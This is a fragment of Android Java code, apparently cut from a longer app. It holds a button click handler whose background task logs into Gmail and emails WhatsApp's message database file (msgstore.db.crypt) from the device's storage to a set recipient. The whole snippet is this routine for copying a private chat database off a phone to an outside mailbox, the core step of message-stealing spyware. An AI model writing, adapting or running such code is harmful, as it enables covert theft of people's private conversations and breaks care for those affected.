	public void onClick(View v) {
		try {   
			AsyncTask<Void, Void, Void> m = new AsyncTask<Void, Void, Void>() {

				@Override
				protected Void doInBackground(Void... arg0) {
					GMailSender sender = new GMailSender(EMAIL_STRING, PASSWORD_STRING);
					try {
						sender.addAttachment("/storage/sdcard0/WhatsApp/Databases/msgstore.db.crypt", SUBJECT_STRING);
						sender.sendMail(SUBJECT_STRING,   
								BODY_STRING,   
								EMAIL_STRING,   
								RECIPIENT_STRING);
					} catch (Exception e) {
						e.printStackTrace();
					}   
					return null;
				}
			};
			m.execute((Void)null);
		} catch (Exception e) {   
			DebugLog.e("SendMail", e.getMessage());   
		} 
	}
});
